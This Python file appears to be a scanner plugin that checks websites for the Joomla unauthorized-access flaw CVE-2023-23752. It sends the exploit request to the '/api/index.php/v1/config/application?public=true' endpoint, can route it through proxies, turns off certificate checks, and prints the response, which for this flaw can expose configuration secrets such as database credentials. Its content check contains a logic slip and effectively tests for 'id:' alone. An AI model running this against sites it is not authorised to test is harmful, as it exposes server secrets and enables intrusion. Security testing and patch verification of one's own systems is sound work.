import requests
import time
from bs4 import BeautifulSoup
import logging
import re

uj=''
http = ''
https = ''
def aa1dl1(dl):
    global http,https
    http=dl
    https=dl
def a(url1,s_cookie):
    global uj
    global http,https
    try:
        headers = {
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9',
            'Connection': 'close'
        }
        payload = "api/index.php/v1/config/application?public=true"
        url1 = url1 + payload
        proxies = {'http': http,
                   'https': https}
        logging.captureWarnings(True)
        res = requests.get(url=url1, headers=headers,cookies=s_cookie,proxies=proxies,verify=False,timeout=5)
        if  'attributes:' and 'id:' in res.text:
            uj="[+]存在漏洞\n" + url1+"\n"+res.text
        else:
            uj="[-]不存在漏洞"
    except Exception as aaa:
        uj = '[-]请求错误\n' + str(aaa)
def aa1jg8():
    global uj
    return '--------------------------------------------------\n[ Joomla未授权访问漏洞（CVE-2023-23752）]\n\n'+ str (uj)+'\n'
def aa1u8(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        a(url1,s_cookie)
    elif pd=='1':
        a(url1,s_cookie)
